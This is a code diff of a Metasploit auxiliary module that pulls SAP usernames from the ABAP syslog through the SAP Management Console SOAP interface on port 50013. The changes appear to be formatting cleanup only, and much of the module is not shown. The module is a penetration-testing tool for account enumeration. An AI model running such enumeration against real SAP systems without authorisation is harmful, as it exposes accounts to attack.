@@ -10,32 +10,32 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'SAP Management Console Extract Users',
-      'Description'  =>  %q{
+      'Name' => 'SAP Management Console Extract Users',
+      'Description' => %q{
         This module simply attempts to extract SAP users from the ABAP
         Syslog through the SAP Management Console SOAP Interface.
         },
-      'References'   =>
-        [
-          # General
-          [ 'URL', 'http://blog.c22.cc' ]
-        ],
-      'Author'       => [ 'Chris John Riley' ],
-      'License'      => MSF_LICENSE
+      'References' => [
+        # General
+        [ 'URL', 'http://blog.c22.cc' ]
+      ],
+      'Author' => [ 'Chris John Riley' ],
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
         Opt::RPORT(50013),
         OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
-      ])
+      ]
+    )
     register_autofilter_ports([ 50013 ])
   end
 
   def run_host(ip)
     res = send_request_cgi({
-      'uri'     => normalize_uri(datastore['URI']),
-      'method'  => 'GET'
+      'uri' => normalize_uri(datastore['URI']),
+      'method' => 'GET'
     }, 25)
 
     if not res
@@ -70,14 +70,14 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_raw({
-        'uri'      => normalize_uri(datastore['URI']),
-        'method'   => 'POST',
-        'data'     => data,
-        'headers'  =>
+        'uri' => normalize_uri(datastore['URI']),
+        'method' => 'POST',
+        'data' => data,
+        'headers' =>
           {
             'Content-Length' => data.length,
             'SOAPAction'	=> '""',
-            'Content-Type'  => 'text/xml; charset=UTF-8',
+            'Content-Type' => 'text/xml; charset=UTF-8',
           }
       }, 60)
 
@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
         case res.body
         when nil
           # Nothing
-        when/<User>([^<]+)<\/User>/i
+        when /<User>([^<]+)<\/User>/i
           body = []
           body = res.body unless res.body.nil?
           users = body.scan(/<User>([^<]+)<\/User>/i)
@@ -101,7 +101,6 @@ class MetasploitModule < Msf::Auxiliary
           fault = true
         end
       end
-
     rescue ::Rex::ConnectionError
       print_error("#{rhost}:#{rport} [SAP] Unable to attempt authentication on #{rhost}:#{rport}")
       return
@@ -114,7 +113,7 @@ class MetasploitModule < Msf::Auxiliary
         :proto => 'tcp',
         :port => rport,
         :type => 'sap.users',
-        :data => {:proto => "soap", :users => users},
+        :data => { :proto => "soap", :users => users },
         :update => :unique_data
       )
 
